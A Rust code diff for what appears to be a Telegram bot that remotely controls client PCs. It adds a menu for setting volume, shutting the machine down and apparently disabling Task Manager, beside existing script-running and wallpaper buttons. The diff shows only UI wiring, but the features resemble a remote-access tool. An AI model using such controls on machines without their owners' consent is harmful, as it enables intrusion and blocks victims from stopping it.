@@ -8,7 +8,7 @@ pub mod ui {
     use crate::telegram::dialogs::send_notify_dialog::notify_dialog::NotificationData;
     use rust_i18n::t;
 
-    pub fn show_notification_editor(client_id: String, data: Option<NotificationData>) -> (String, Option<InlineKeyboardMarkup>) {
+    pub fn show_notification_editor(data: Option<NotificationData>) -> (String, Option<InlineKeyboardMarkup>) {
         let data = data.clone().unwrap_or_default();
         let text = t!("menu.send_notify", "title" => data.title, "text" => data.message).to_string();
         let keyboard = InlineKeyboardMarkup::new(vec![
@@ -90,13 +90,26 @@ pub mod ui {
         (text, InlineKeyboardMarkup::new(keyboard))
     }
 
+    // PC Control Menu
+    pub fn show_pc_control_menu(client: &RPTClient) -> (String, InlineKeyboardMarkup) {
+        let text = t!("menu.pc_control_menu").to_string();
+        let keyboard = InlineKeyboardMarkup::new(vec![
+            vec![InlineKeyboardButton::callback(t!("button.set_volume_max"), format!("set_volume|{}&&&100", client.id)), InlineKeyboardButton::callback(t!("button.set_volume_min"), format!("set_volume|{}&&&0", client.id))],
+            vec![InlineKeyboardButton::callback(t!("button.shutdown_pc"), format!("shutdown_pc|{}", client.id)), InlineKeyboardButton::callback(t!("button.off_tskmngr"), format!("off_tskmngr|{}", client.id))],
+            vec![InlineKeyboardButton::callback(t!("button.back"), format!("open_client|{}", client.id))]
+        ]);
+
+        (text, keyboard)
+    }
+
+    // CLIENT MENU
     pub fn show_client_menu(client: &RPTClient) -> (String,InlineKeyboardMarkup) {
         let connected_fmt = client.connected.format("%Y-%m-%d %H:%M:%S").to_string();
         let id = &client.id;
         let keyboard: InlineKeyboardMarkup = InlineKeyboardMarkup::new(vec![
             vec![InlineKeyboardButton::callback(t!("button.run_script"), format!("open_scripts|{id}")), InlineKeyboardButton::callback(t!("button.play_audio"), format!("audio|{id}"))],
             vec![InlineKeyboardButton::callback(t!("button.send_notify"), format!("send_message|{id}")),InlineKeyboardButton::callback(t!("button.change_cursor"), format!("change_cursor|{id}"))],
-            vec![InlineKeyboardButton::callback(t!("button.change_wallpaper"), format!("change_wallpaper|{id}"))],
+            vec![InlineKeyboardButton::callback(t!("button.change_wallpaper"), format!("change_wallpaper|{id}")), InlineKeyboardButton::callback(t!("button.control_pc"), format!("pc_c|{id}"))],
             vec![InlineKeyboardButton::callback(t!("button.back_to_clients"), "show_clients")]
         ]);
 
